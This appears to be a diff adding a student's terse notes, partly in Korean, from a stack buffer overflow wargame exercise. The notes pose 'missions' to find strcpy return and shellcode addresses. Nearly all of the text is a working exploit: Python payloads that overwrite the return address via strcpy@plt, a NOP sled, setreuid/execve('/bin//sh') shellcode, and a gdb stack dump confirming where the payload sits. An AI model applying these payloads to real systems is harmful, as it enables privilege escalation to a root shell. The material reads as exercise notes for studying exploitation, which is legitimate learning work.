@@ -1,0 +1,44 @@
+0x40 07 67 b0
+40 07 67 b0
+
+0x8048410
+`python -c 'print "X"*44 + "\x10\x84\x04\x08" + "CCCC"'`
+
+
+gdb
+0x8048746 <main+146>:	call   0x8048400 <memset>
+
+#미션1
+strcpy arg0에 해당하는 strcpy ret주소를 구해라
+0xbffffa20
+
+#미션2
+strcpy arg1에 해당하는 쉘코드 주소를 구해라
+0xbffffa2c
+
+#미션3
+쉨코드의 주소를 구해라
+0xbffffa5c
+
+`python -c 'print "A"*44+"\x10\x84\x04\x08"+"XXXX"+"\xa7\xfb\xff\xbf"+"\xb3\xfb\xff\xbf"+"\xb7\xfb\xff\xbf"+"\x90"*100+"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80"'`
+
+
+
+
+gdb
+`python -c 'print "A"*44+"\x10\x84\x04\x08"+"XXXX"+"BBBB"+"CCCC"+"DDDD"+"\x90"*100+"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80"'`
+
+(gdb) x/50x 0xbffffb77
+0xbffffb77:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffb87:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffb97:	0x41414141	0x41414141	0x41414141	0x08048410
+0xbffffba7:	0x58585858	0x42424242	0x43434343	0x44444444
+0xbffffbb7:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffbc7:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffbd7:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffbe7:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffbf7:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffc07:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffc17:	0x90909090	0x31b0c031	0xc38980cd	0xc031c189
+0xbffffc27:	0x80cd46b0	0x6852d231	0x68732f2f	0x69622f68
+0xbffffc37:	0x52e3896e	0x31e18953
